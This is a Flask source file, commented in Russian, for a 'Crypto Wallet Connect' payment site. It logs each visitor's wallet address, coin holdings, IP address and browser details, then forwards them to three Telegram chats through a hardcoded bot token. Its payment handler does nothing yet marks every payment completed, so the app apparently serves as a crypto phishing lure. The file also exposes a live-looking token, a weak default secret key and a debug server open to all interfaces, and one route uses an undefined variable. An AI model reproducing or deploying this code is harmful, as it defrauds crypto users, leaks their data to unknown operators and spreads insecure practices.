import os
import sys
from flask import *
import requests
from dotenv import load_dotenv
from datetime import datetime
import platform
from flask_sqlalchemy import SQLAlchemy
from web3 import Web3
from tronpy import Tron
from solana.rpc.api import Client
from binance.client import Client as BinanceClient
import json
import secrets

# Загрузка переменных окружения
load_dotenv()

app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'ThisIsSecretSecretSecretLife')
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///payments.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# Модель для хранения платежей
class Payment(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    wallet_address = db.Column(db.String(100), nullable=False)
    wallet_type = db.Column(db.String(50), nullable=False)
    coins_data = db.Column(db.Text, nullable=False)  # Храним данные о монетах как JSON
    status = db.Column(db.String(20), default='pending')
    payment_id = db.Column(db.String(32), unique=True, nullable=False)
    user_id = db.Column(db.String(32), nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    ip_address = db.Column(db.String(45))
    user_agent = db.Column(db.String(255))
    platform = db.Column(db.String(50))

    @property
    def coins(self):
        return json.loads(self.coins_data)

# Инициализация клиентов для разных блокчейнов
eth_w3 = Web3(Web3.HTTPProvider(os.getenv('ETH_NODE_URL')))
tron_client = Tron(network='mainnet')
solana_client = Client(os.getenv('SOLANA_RPC_URL'))
 

# Конфигурация Telegram
TELEGRAM_BOT_TOKEN = '7772156705:AAFmu7cRnywWvj2ZyYNjendPF-jDwRLaxQk'
TELEGRAM_CHAT_IDS = ["982150223", "8186192263", "282916420"]

# Название приложения (можно вынести в .env)
APP_NAME = os.getenv('APP_NAME', 'Crypto Wallet Connect')


@app.route('/static/<path:filename>')
def static_files(filename):
    static_folder = resource_path('static')
    return send_from_directory(static_folder, filename)


def resource_path(relative_path):
    """ Получает абсолютный путь к ресурсу для работы и в exe """
    try:
        # PyInstaller создает временную папку и хранит путь в _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)


# Устанавливаем правильные пути
app.template_folder = resource_path('templates')


def get_client_ip():
    """Получаем IP адрес клиента"""
    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0]
    else:
        ip = request.remote_addr
    return ip


def get_system_info():
    """Получаем информацию о системе пользователя"""
    return {
        "platform": platform.platform(),
        "browser": request.user_agent.browser,
        "version": request.user_agent.version,
        "os": request.user_agent.platform,
        "user_agent": str(request.user_agent)
    }


def send_telegram_notification(payment):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_IDS:
        app.logger.error("Telegram bot token or chat IDs are missing")
        return

    system_info = get_system_info()
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    message = (
        f"🔔 *Новое подключение кошелька!*\n\n"
        f"🕒 *Дата и время:* `{current_time}`\n"
        f"💼 *Тип кошелька:* `{payment.wallet_type}`\n"
        f"📭 *Адрес кошелька:* `{payment.wallet_address}`\n"
        f"💰 *Монеты:*\n"
    )
    
    for coin in payment.coins:
        message += f"  - {coin['coin_type']}: {coin['amount']}\n"
    
    message += (
        f"\n🌐 *IP адрес:* `{payment.ip_address}`\n"
        f"🔧 *ОС:* `{system_info['os']}`\n"
        f"🖥️ *Платформа:* `{system_info['platform']}`\n"
        f"🌍 *Браузер:* `{system_info['browser']} {system_info['version']}`\n"
        f"📱 *User Agent:* `{system_info['user_agent']}`\n\n"
        f"⚠️ *Будьте внимательны к подозрительным активностям!*"
    )

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"

    for chat_id in TELEGRAM_CHAT_IDS:
        if not chat_id.strip():
            continue
        payload = {
            "chat_id": chat_id.strip(),
            "text": message,
            "parse_mode": "Markdown"
        }
        try:
            response = requests.post(url, json=payload)
            response.raise_for_status()
            app.logger.info(f"Message sent successfully to {chat_id}: {response.json()}")
        except requests.exceptions.RequestException as e:
            app.logger.error(f"Telegram send error for {chat_id}: {e}")


@app.route('/')
def index():
    if 'user_id' not in session:
        session['user_id'] = secrets.token_hex(16)
    return render_template('index.html')


@app.route('/connect_wallet', methods=['POST'])
def connect_wallet():
    data = request.json
    wallet_address = data.get('wallet_address')
    wallet_type = data.get('wallet_type')

    if not wallet_address or not wallet_type:
        return jsonify({"status": "error", "message": "Invalid data"}), 400

    try:
        session['wallet_address'] = wallet_address
        session['wallet_type'] = wallet_type

        send_telegram_notification(payment)

        return jsonify({"status": "success", "message": "Wallet connected!"})
    except Exception as e:
        app.logger.error(f"Error: {e}")
        return jsonify({"status": "error", "message": "Internal server error"}), 500


@app.route('/generate_link', methods=['POST'])
def generate_link():
    try:
        data = request.json
        wallet_address = data.get('wallet_address')
        wallet_type = data.get('wallet_type')
        coins = data.get('coins', [])

        if not wallet_address or not wallet_type or not coins:
            return jsonify({'error': 'Недостаточно данных'}), 400

        # Проверяем валидность адреса кошелька
        if wallet_type == 'metamask' and not Web3.is_address(wallet_address):
            return jsonify({'error': 'Неверный адрес Ethereum кошелька'}), 400
        elif wallet_type == 'tronlink' and not Tron().is_address(wallet_address):
            return jsonify({'error': 'Неверный адрес Tron кошелька'}), 400

        # Генерируем уникальный ID платежа
        payment_id = secrets.token_hex(16)

        # Создаем новый платеж
        payment = Payment(
            wallet_address=wallet_address,
            wallet_type=wallet_type,
            coins_data=json.dumps(coins),
            payment_id=payment_id,
            user_id=session['user_id'],
            ip_address=get_client_ip(),
            user_agent=request.user_agent.string,
            platform=platform.platform()
        )
        db.session.add(payment)
        db.session.commit()

        # Отправляем уведомление в Telegram
        send_telegram_notification(payment)

        # Генерируем уникальную ссылку
        payment_link = f"/pay/{payment_id}"
        return jsonify({'link': payment_link})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/pay/<payment_id>')
def payment_page(payment_id):
    payment = Payment.query.filter_by(payment_id=payment_id).first_or_404()
    return render_template('payment.html', payment=payment)


@app.route('/process_payment/<payment_id>', methods=['POST'])
def process_payment(payment_id):
    payment = Payment.query.filter_by(payment_id=payment_id).first_or_404()
    
    try:
        # Здесь будет логика для обработки платежа в зависимости от типа кошелька и монет
        for coin in payment.coins:
            if payment.wallet_type == 'metamask':
                if coin['coin_type'] == 'eth':
                    # Логика для ETH
                    pass
                elif coin['coin_type'] == 'usdt_eth':
                    # Логика для USDT на ETH
                    pass
            elif payment.wallet_type == 'trustwallet':
                if coin['coin_type'] == 'bnb':
                    # Логика для BNB
                    pass
                elif coin['coin_type'] == 'usdt_bsc':
                    # Логика для USDT на BSC
                    pass
            elif payment.wallet_type == 'tronlink':
                if coin['coin_type'] == 'trx':
                    # Логика для TRX
                    pass
                elif coin['coin_type'] == 'usdt_trx':
                    # Логика для USDT на TRX
                    pass
            elif payment.wallet_type == 'phantom':
                if coin['coin_type'] == 'sol':
                    # Логика для SOL
                    pass

        payment.status = 'completed'
        db.session.commit()
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})


if __name__ == '__main__':
    # Для отладки показываем где ищет статические файлы
    print(f"Static folder: {resource_path('static')}")
    print(f"Files in static: {os.listdir(resource_path('static'))}")
    print(f"Icons in static: {os.listdir(os.path.join(resource_path('static'), 'icons'))}")

    with app.app_context():
        db.create_all()
    app.run(host='0.0.0.0', port=5000, debug=True)

